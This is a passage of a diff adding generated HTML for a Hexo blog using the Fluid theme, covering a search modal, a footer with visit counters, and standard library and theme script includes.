+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
